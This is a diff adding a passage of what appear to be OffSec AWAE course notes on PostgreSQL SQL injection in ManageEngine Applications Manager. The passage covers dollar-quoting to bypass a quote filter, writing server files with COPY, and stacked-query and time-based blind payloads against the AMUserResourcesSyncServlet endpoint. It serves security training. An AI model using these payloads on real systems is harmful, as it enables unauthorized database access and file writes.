@@ -343,4 +343,47 @@ LINE 3: COPY AWAE (offsec) TO CHR(99)||CHR(58)||CHR(92)||CHR(92)||CH...
 2
 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Code_point ↩︎
 
+##### It Makes Lexical Sense
+
+PostgreSQL syntax also supports dollar-quoted string constants. Their purpose is to make it easier to read statements that contain strings with literal quotes.
+
+Essentially, two dollar characters ($$) can be used as a quote (') substitute by themselves, or a single one ($) can indicate the beginning of a "tag." The tag is optional, can contain zero or more characters, and is terminated with a matching dollar ($). If used, this tag is then required at the end of the string as well.
+
+```
+SELECT 'AWAE';
+SELECT $$AWAE$$;
+SELECT $TAG$AWAE$TAG$;
+```
+This allows us to fully bypass the quotes restriction we have previously encountered as shown in the listing below.
+
+```
+CREATE TEMP TABLE AWAE(offsec text);INSERT INTO AWAE(offsec) VALUES ($$test$$);
+COPY AWAE(offsec) TO $$C:\Program Files (x86)\PostgreSQL\9.2\data\test.txt$$;
+
+COPY 1
+
+Query returned successfully in 201 msec.
+```
+
+
+1 (The PostgreSQL Global Development Group, 2020), https://www.postgresql.org/docs/9.2/static/sql-syntax-lexical.html ↩︎
+
+#### Blind Bats
+
+```
+GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;<some query>;--+ HTTP/1.0
+Host: manageengine:8443
+```
+Listing 28 - The ability for us to execute arbitrary SQL statements through stacked queries
+
+```
+SELECT current_setting('is_superuser');
+```
+Listing 29 - Checking our DB privileges
+
+```GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+
+Host: manageengine:8443
+```
+Listing 30 - Checking if we are DBA
+
 
